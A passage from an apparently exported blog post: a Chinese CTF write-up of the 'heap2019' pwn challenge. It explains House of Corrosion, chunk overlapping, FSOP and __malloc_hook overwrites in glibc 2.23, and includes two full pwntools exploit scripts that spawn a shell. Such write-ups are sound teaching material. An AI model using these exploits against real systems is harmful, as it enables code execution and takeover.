size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n此处利用任意地址写`0xdead`来修改`global_max_fast`的大小，之后利用`free`将一个堆地址写到`_IO_list_all`来劫持`IO`流。被写的这个堆地址指向的`chunk`就是之前overlapping构造好的`chunk`，因此`size`需要提前计算好并设置。\n\n## FSOP\n\n劫持`_IO_list_all`后就可以伪造一个`IO_FILE`结构体，并伪造其`vtable`（glibc-2.23没有对`vtable`的合法性检查），程序里面有`exit`的功能，会调用`exit()`，因此这里选择的是走`exit() -> ... ->  _IO_flush_all_lockp() -> _IO_OVERFLOW`的链。\n\n为此伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n伪造`_flags=\"/bin/sh\\x00\"`，`vtable`中的`_IO_OVERFLOW=system`，当调用`exit()`时就会一路调用到`system(\"/bin/sh\\x00\")`。\n\n伪造的`IO`如下：\n\n```py\n# construct fake io\npayload=p64(0)*3+p64(sys_addr)+'a'*0x70\nfake_io=\"/bin/sh\\x00\"+p64(0x1411)\nfake_io+=p64(0)*3+p64(1)+p64(0)\nfake_io=fake_io.ljust(0xd8,'\\x00')\nfake_io+=p64(heapbase+0x150) # vtable\npayload+=fake_io\n```\n\n## exp\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\ndef add(length,content):\n  ru(\"4.exit\\n\")\n  sl(\"1\")\n  ru(\"Content length:\\n\")\n  sl(str(length))\n  ru(\"Content:\")\n  s(str(content))\n\ndef delete(id):\n  ru(\"4.exit\\n\")\n  sl(\"3\")\n  ru(\"Content id:\\n\")\n  sl(str(id))\n\ndef edit(addr):\n  ru(\"4.exit\\n\")\n  sl(\"2\")\n  ru(\"Comment:\\n\")\n  s(addr)\n\ndef get_heap_addr():\n  ru(\"4.exit\\n\")\n  sl(\"2019\")\n  heap_list=ru(\"\\n\")\n  heap_list=int(heap_list[2:],16)\n  return heap_list\n\nheap_list=get_heap_addr()\nelfbase=heap_list-0x202040\n\nadd(0x98,'a'*0x98) # 0\nadd(0x98,'b'*0x98) # 1\ndelete(0)\nadd(0x98,\"aaaaaaaa\") # 0\nru(\"aaaaaaaa\")\nlibcbase=uu64(ru(\"\\x7f\"))-3951480 \n\nadd(0x98,'c'*0x98) # 2\nadd(0x98,'d'*0x98) # 3\nadd(0x98,'f'*0x98) # 4\ndelete(0)\ndelete(2)\n\nadd(0x98,'aaaaaaaa') # 0\nru(\"aaaaaaaa\")\nheapbase=uu64(ru('\\n')[:-1])-0x140\n\nglobal_max_fast=libcbase+0x3c67f8\n_IO_list_all=libcbase+libc.sym['_IO_list_all']\nfastbinsY=libcbase+libc.sym['__malloc_hook']+0x10+0x8\nchunk_size=(_IO_list_all-fastbinsY)*2+0x20-0x10\nsys_addr=libcbase+libc.sym['system']\n\n# construct fake prev_size and size to bypass unlink when add\npayload='c' * 0x28 + p64(0xd8) + p64(0x61)\nadd(0x98,payload) # 2\n\n# update the size\ndelete(4)\ndelete(3)\nadd(chunk_size,'d'*0x98) # 3\nadd(0x98,'f'*0x98) # 4\n\n# delete 1 and overwrite its size to 0xde\ndelete(1)\npayload='a'*0x20+p64(heapbase+0xa8-0x3)\nedit(payload)\n\npayload='A'*0x90+p64(0)+p64(chunk_size+0x10+0xa1)\nadd(0xa8,payload) # 1\n\n# 5 will not exist, put all free chunk to small bin to prevent unexpected error\nru(\"4.exit\\n\")\nsl(\"1\")\nru(\"Content length:\\n\")\nsl(str(0x100))\n\ndelete(2)\n\npayload='g'*0x90+p64(0)+p64(chunk_size+0x11)\n\nadd(0x14a0,payload) # 2\n\n# write global_max_fast to 0xdead\npayload='a'*0x20+p64(global_max_fast-0x2)\nedit(payload)\n\n# House of corrosion\n# hijack _IO_list_all\ndelete(3)\n\ndelete(2)\n# construct fake io\npayload=p64(0)*3+p64(sys_addr)+'a'*0x70\nfake_io=\"/bin/sh\\x00\"+p64(0x1411)\nfake_io+=p64(0)*3+p64(1)+p64(0)\nfake_io=fake_io.ljust(0xd8,'\\x00')\nfake_io+=p64(heapbase+0x150) # vtable\npayload+=fake_io\n# overwrite 3\nadd(0x14b0-0x10,payload) # 2\n\n\nleak(\"heap_list\",hex(heap_list))\nleak(\"elfbase\",hex(elfbase))\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\nleak(\"global_max_fast\",hex(global_max_fast))\nleak(\"_IO_list_all\",hex(_IO_list_all))\nleak(\"fastbinsY\",hex(fastbinsY))\nleak(\"chunk_size\",hex(chunk_size))\nleak(\"sys_addr\",hex(sys_addr))\n# debug()\n\n# trigger\nru(\"4.exit\\n\")\nsl(\"4\")\n\nitr()\n```\n\n## 其他思路\n\n如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的`chunk`的`size`有所不同，这里需要另其为`0xd0`，这样才能通过任意地址写`0xde`来伪造`size`。\n\n首先需要利用任意地址写`0xde`修改`global_max_fast`，让`0xd0`大小的`chunk`都能被认为是`fast bin chunk`，之后将overlapping的大小为`0xd0`的`chunk`释放到越界的`fast bin`中。\n\n打`__malloc_hook`的话，由于只能任意地址写`0xde`来伪造`size`，需要在`__malloc_hook`前面找一段`0x0000000000000000`的空间来伪造`size`。\n\n伪造好后利用overlapping修改`0xd0`大小的`fast bin`中`chunk`的`fd==fake_chunk`，之后申请两次即可得到`__malloc_hook`处的内存，修改其为`one_gadget`即可`get shell`。\n\nexp:\n\n```py\nfrom pwn import *\ncontext(os = 'linux',arch = 'amd64',log_level = 'debug')\n       \nmode = 1\nif mode == 1:\n    fang = process(\"./heap2019\")  \nelse:\n    fang = remote(\"node4.buuoj.cn\",28812)\n\ndef debug():\n    gdb.attach(fang)\n    pause()\n\ndef alloc2(size):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(1))\n    fang.recvuntil(\"Content length:\\n\")\n    fang.sendline(str(size))\n\ndef alloc(size,cont):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(1))\n    fang.recvuntil(\"Content length:\\n\")\n    fang.sendline(str(size))\n    fang.recvuntil(\"Content:\\n\")\n    fang.send(cont)\n\ndef dele(idx):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(3))\n    fang.recvuntil(\"Content id:\\n\")\n    fang.sendline(str(idx))\n\ndef edit(cont):\n    fang.recvuntil(\"4.exit\\n\")\n    fang.sendline(str(2))\n    fang.recvuntil(\"Comment:\\n\")\n    fang.send(cont)\n\n# libc = ELF(\"./libc-2.23.so\")\nlibc = ELF(\"/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so\")\n\n# gdb.attach(fang,'b *(0x555555400000 + 0xc1d)')\n# pause()\n\nfang.recvuntil(\"4.exit\\n\")\nfang.sendline(str(2019))\nfang.recvuntil(\"0x\")\nelf_base = int(fang.recv(12),16) - 0x202040\n\n\nalloc(0x98,b'a' * 0x98) # 0\n\npayload = b'a' * 0x98\nalloc(0x98,payload) # 1\n\nalloc(0x98,payload) # 2\n\npd = b'b' * 0x98\nalloc(0x98,pd) # 3\n\npd = b'A' * 0x20 + p64(0) + p64(0x71)\nalloc(0x98,pd) # 4\n\ndele(0)\nalloc(0x98,b'a') # 0\nfang.recvuntil(\"Data is:\\n\")\nlibc_base = u64(fang.recv(6).ljust(8,b'\\x00')) - 0x3c4b61\none_gadget4 = [0x45226,0x4527a,0xf03a4,0xf1247]\none_gadget_addr = libc_base + one_gadget4[3]\n\ndele(0)\ndele(2)\nalloc(0x98,b'aaaaaaaa') # 0\nfang.recvuntil(\"aaaaaaaa\")\nheap_base = u64(fang.recv(6).ljust(8,b'\\x00')) - 0x140\n\n# 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的\n# 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size\n# 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况\npayload = b'b' * 0x28 + p64(0xd8) + p64(0x61)\nalloc(0x98,payload) # 2\n\ndele(1)\npayload = b'a' * 0x20 + p64(heap_base + 0xa8 - 3)\nedit(payload)\n\n# 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size\npayload = b\"A\" * 0x90 + p64(0) + p64(0x141)\nalloc(0xa8,payload) # 1\n\nalloc2(0x98) # 5 马上free的，只是把unsorted剩下的赶进去small bin\n\n# 放进 unsorted bin\ndele(2)\n\npayload = b'a' * 0x90 + p64(0) + p64(0xd1)\nalloc(0x130,payload) # 2\n\ndele(2)\n\n# 修改 global_max_fast\npayload = b'a' * 0x20 + p64(libc_base + 0x3c67f8 - 3)\nedit(payload)\n\n# 进入 fastbinsY，越界写到了last_remainder\ndele(3)\n\n# 在__malloc_hook前伪造size\npayload = b'a' * 0x20 + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 + 8 - 3)\nedit(payload)\n\n# 覆写fd指向fake chunk(__malloc_hook前)\npayload = b'a' * 0x90 + p64(0) + p64(0xd1) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x30 )\nalloc(0x130,payload) # 2\n\nalloc(0xc0,'BBBB') # 3\n\ndele(0)\n\n# 分配并修改malloc\npayload = b'A' * 0x18 + p64(one_gadget_addr) + p64(libc_base + libc.symbols[\"realloc\"])\nalloc(0xc0,payload) # 0\n\n# gdb.attach(fang,'b *(0x555555400000 + 0xAC9)')\n# pause()\nalloc2(0x100)\n\nlog.info(\"elf_base : 0x%x\" % elf_base)\nlog.info(\"libc_base : 0x%x\" % libc_base)\nlog.info(\"heap_base : 0x%x\" % heap_base)\n# debug()\n\nfang.interactive()\n\"\"\"\n0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n\"\"\"\n```\n\n","slug":"铁人三项heap2019","published":1,"updated":"2023-01-12T01:44:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagq006r5oudh5jx0qva","content":"<p>第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。</p>\n<span id=\"more\"></span>\n\n<p>保护全开，先逆向看下。</p>\n<p>64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写<code>0xdeadbeef</code>；alloc 限制了 size &gt; 0x90 &amp;&amp; size &lt;= 0x2333，申请不到<code>fast bin chunk</code>，不过使用的是<code>malloc</code>，没有对申请的内存进行清理；free没有问题。</p>\n<p><img src=\"./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png\" alt=\"img\"></p>\n<p>利用的是House of Corrosion，将0xdeadbeef调整偏移写到<code>global_max_fast</code>。<code>global_max_fast</code>是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。</p>\n<p>改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。<code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<p>一开始打算将<code>globla_max_fast</code>写为<code>0xdead</code>，通过free直接将堆地址写入<code>_IO_list_all</code>打FSOP，结果free后的chunk中只有<code>fd</code>字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。</p>\n<p>后面参考了下main的思路，也有了些想法。</p>\n<ol>\n<li><p>main的思路：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到__malloc_hook附近修改__malloc_hook</code>。</p>\n</li>\n<li><p>同main的思路，但是打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -&gt; 走exit到_IO_OVERFLOW</code>（未尝试过）。</p>\n</li>\n<li><p>借鉴main的思路，利用<code>House of Corrosion</code>打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xdead增大global_max_fast -&gt; 利用House of Corrosion劫持_IO_list_all -&gt; 利用overlapping伪造IO_FILE -&gt; 走exit到_IO_OVERFLOW</code>。</p>\n</li>\n</ol>\n<p>下面先按照3的思路写：</p>\n<h2 id=\"leak\"><a href=\"#leak\" class=\"headerlink\" title=\"leak\"></a>leak</h2><p>这题泄露地址挺简单的，输入<code>2019</code>就会返回<code>bss</code>中的<code>heap_list</code>，借此可以泄露出程序基地址。</p>\n<p>libc和heap地址泄露也不难，程序中<code>malloc</code>时不会清理原有数据，因此可以借助<code>unsorted bin chunk的fd和bk</code>泄露libcbase和heapbase。</p>\n<h2 id=\"overlapping\"><a href=\"#overlapping\" class=\"headerlink\" title=\"overlapping\"></a>overlapping</h2><p>首先利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。</p>\n<p>ptmalloc<strong>完全依靠<code>chunk</code>的<code>prev_size</code>和<code>size</code>两个字段来判断chunk的使用情况和对chunk的前后块进行定位</strong>，即使<code>prev_size</code>和<code>size</code>是有问题的，只要能通过检查就能正常执行。</p>\n<p>在这道题中就是如此，利用任意地址写<code>0xdeadbeef</code>可以伪造<code>chunk</code>的<code>size</code>为<code>0xde</code>，这个<code>size</code>在64位系统下是不正常的，因为64位系统下的<code>size</code>是<code>0x10</code>对齐的，正常情况下不会出现这样<code>size</code>的<code>chunk</code>，这个<code>size</code>的<code>chunk</code>也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个<code>size</code>的<code>chunk</code>是可以使用的（除了不能直接malloc）。</p>\n<p>那要如何利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping呢？**关键在于伪造<code>chunk</code>前后的<code>prev_size</code>和<code>size</code>**。ptmalloc定位<code>next chunk</code>的方法是<code>chunk + (size - flags)</code>，通过此式子在对应的位置写入合理的<code>prev_size</code>和<code>size</code>，保证<code>size==next_chunk-&gt;prev_size</code>和<code>chunk+size==next_chunk</code></p>\n<p>本题中通过修改<code>free</code>后<code>chunk</code>的<code>size</code>为<code>0xde</code>实现初步的overlapping，但这是不够的。由于这个<code>size</code>的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的<code>chunk</code>，而这个<code>chunk</code>最大也只有<code>0xb0</code>的大小（<code>last_remainder&gt;=MIN_SIZE</code>才会切割），但就算这个<code>chunk</code>原来申请时申请最小的大小，<code>size</code>也要到<code>0xa0</code>（<code>malloc(0x98)</code>的情况下），最多只能控制到正常情况下下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，对于伪造<code>IO_FILE</code>是不够的（调试的时候看到即使是打<code>__malloc_hook</code>也不够）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/40gx 0x55bf8d2d10a0</span><br><span class=\"line\">0x55bf8d2d10a0:\t0xadbeef00000000a0\t0x00000000000000de &lt;- 伪造 <span class=\"built_in\">id</span>==1的chunk的size，原本为0xa1</span><br><span class=\"line\">0x55bf8d2d10b0:\t0x00007fd3f3138b78\t0x00007fd3f3138b78</span><br><span class=\"line\">0x55bf8d2d10c0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10d0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10e0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d10f0:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1100:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1110:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1120:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1130:\t0x6262626262626262\t0x6262626262626262</span><br><span class=\"line\">0x55bf8d2d1140:\t0x00000000000000a0\t0x00000000000000a0 &lt;- <span class=\"built_in\">id</span>==2</span><br><span class=\"line\">0x55bf8d2d1150:\t0x6363636363636363\t0x6363636363636363 &lt;- 修改 size==de后可以堆叠到这里</span><br><span class=\"line\">0x55bf8d2d1160:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d1170:\t0x6363636363636363\t0x00000000000000d8</span><br><span class=\"line\">0x55bf8d2d1180:\t0x0000000000000061\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d1190:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11a0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11b0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11c0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x55bf8d2d11d0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x55bf8bcdd040</span><br><span class=\"line\">0x55bf8bcdd040:\t0x000055bf8d2d1010\t0x0000000000000000 &lt;- heap_list</span><br><span class=\"line\">0x55bf8bcdd050:\t0x000055bf8d2d1150\t0x000055bf8d2d11f0</span><br><span class=\"line\">0x55bf8bcdd060:\t0x000055bf8d2d2600\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，那我们自然也可以控制其<code>prev_size</code>和<code>size</code>来再次实现overlapping，并且这次构造的<code>prev_size</code>和<code>size</code>的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个<code>chunk</code>的<code>size</code>，不过注意要在对应地方伪造<code>next_chunk-&gt;prev_size</code>。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/30gx 0x563da84b90a0</span><br><span class=\"line\">0x563da84b90a0:\t0xadbeef00000000a0\t0x00000000000000b1 &lt;- <span class=\"built_in\">id</span>==1</span><br><span class=\"line\">0x563da84b90b0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90c0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90d0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90e0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b90f0:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9100:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9110:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9120:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9130:\t0x4141414141414141\t0x4141414141414141</span><br><span class=\"line\">0x563da84b9140:\t0x0000000000000000\t0x00000000000014b1 &lt;- 伪造 <span class=\"built_in\">id</span>==2的chunk的size，原本为0xa0</span><br><span class=\"line\">0x563da84b9150:\t0x6363636363636363\t0x0000000000000029 &lt;- 切割后chunk的位置</span><br><span class=\"line\">0x563da84b9160:\t0x00007f50b666db78\t0x00007f50b666db78</span><br><span class=\"line\">0x563da84b9170:\t0x6363636363636363\t0x0000000000000028</span><br><span class=\"line\">0x563da84b9180:\t0x0000000000000061\t0x6363636363636363</span><br><span class=\"line\">0x563da84b9190:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91a0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91b0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91c0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91d0:\t0x6363636363636363\t0x6363636363636363</span><br><span class=\"line\">0x563da84b91e0:\t0x00000000000000a0\t0x0000000000001411  &lt;- <span class=\"built_in\">id</span>==1</span><br><span class=\"line\">0x563da84b91f0:\t0x6464646464646464\t0x6464646464646464</span><br><span class=\"line\">0x563da84b9200:\t0x6464646464646464\t0x6464646464646464</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x563da7d62040</span><br><span class=\"line\">0x563da7d62040:\t0x0000563da84b9010\t0x0000563da84b90b0 &lt;- heap_list</span><br><span class=\"line\">0x563da7d62050:\t0x0000563da84b9150\t0x0000563da84b91f0</span><br><span class=\"line\">0x563da7d62060:\t0x0000563da84ba600\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>这里我选择的是构造完整包含下一个<code>chunk</code>的<code>size</code>，至此我们构造的overlapping已经足够了。</p>\n<h2 id=\"House-of-Corrision\"><a href=\"#House-of-Corrision\" class=\"headerlink\" title=\"House of Corrision\"></a>House of Corrision</h2><p><code>House of Corrosion</code>是一个很早的利用，<strong>通过改写全局变量<code>global_max_fast</code>来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用</strong>，可以做到越界申请内存或写入一个堆地址。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<p>此处利用任意地址写<code>0xdead</code>来修改<code>global_max_fast</code>的大小，之后利用<code>free</code>将一个堆地址写到<code>_IO_list_all</code>来劫持<code>IO</code>流。被写的这个堆地址指向的<code>chunk</code>就是之前overlapping构造好的<code>chunk</code>，因此<code>size</code>需要提前计算好并设置。</p>\n<h2 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h2><p>劫持<code>_IO_list_all</code>后就可以伪造一个<code>IO_FILE</code>结构体，并伪造其<code>vtable</code>（glibc-2.23没有对<code>vtable</code>的合法性检查），程序里面有<code>exit</code>的功能，会调用<code>exit()</code>，因此这里选择的是走<code>exit() -&gt; ... -&gt;  _IO_flush_all_lockp() -&gt; _IO_OVERFLOW</code>的链。</p>\n<p>为此伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>伪造<code>_flags=&quot;/bin/sh\\x00&quot;</code>，<code>vtable</code>中的<code>_IO_OVERFLOW=system</code>，当调用<code>exit()</code>时就会一路调用到<code>system(&quot;/bin/sh\\x00&quot;)</code>。</p>\n<p>伪造的<code>IO</code>如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake io</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(sys_addr)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span></span><br><span class=\"line\">fake_io=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x1411</span>)</span><br><span class=\"line\">fake_io+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">fake_io=fake_io.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io+=p64(heapbase+<span class=\"number\">0x150</span>) <span class=\"comment\"># vtable</span></span><br><span class=\"line\">payload+=fake_io</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span 